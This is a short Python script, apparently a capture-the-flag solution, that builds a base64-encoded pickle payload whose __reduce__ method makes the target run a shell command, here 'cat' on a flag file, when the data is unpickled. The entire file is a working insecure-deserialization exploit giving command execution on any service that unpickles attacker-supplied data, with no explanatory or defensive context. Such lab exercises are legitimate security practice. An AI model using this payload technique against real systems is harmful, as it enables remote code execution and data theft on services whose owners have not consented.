import pickle
import os
import subprocess
from base64 import b64encode

class anti_pickel_serum(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat','flag_wIp1b'],)
    
pickled = pickle.dumps({'serum': anti_pickel_serum()}, protocol=0)

encodedPickle = b64encode(pickled)

print(encodedPickle)